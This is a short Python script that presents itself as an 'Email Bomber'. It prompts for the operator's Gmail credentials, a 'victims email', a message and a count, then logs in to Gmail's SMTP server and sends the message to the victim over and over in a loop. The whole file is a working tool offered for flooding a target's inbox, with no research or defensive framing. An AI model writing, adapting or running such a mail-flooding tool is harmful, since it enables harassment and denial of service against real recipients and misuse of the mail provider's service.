import smtplib
import time
import sys
from getpass import getpass


print('''



███████╗███╗░░░███╗  ██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
██╔════╝████╗░████║  ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
█████╗░░██╔████╔██║  ██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
██╔══╝░░██║╚██╔╝██║  ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
███████╗██║░╚═╝░██║  ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
╚══════╝╚═╝░░░░░╚═╝  ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝


	''')


z = """                 
-------- [~]This is an Email Bomber[~] --------
"""


for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)


print("")

#Your email
sender_email = input("[+] Enter your Email: ")
password = getpass("[+] Enter your Password: ")
print("")


#Victims email address
victims_email = input("[~] Enter victims email: ")
print("")

#Text that you want to send...
message = input("[~] Enter the message: ")
times = int(input("[~] Number of Emails to send : "))
print("")


#how many times do you want to send it
for i in range(times):
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(sender_email, password)
	print(f"Sended successfully! {i}")
	server.sendmail(sender_email, victims_email, message)

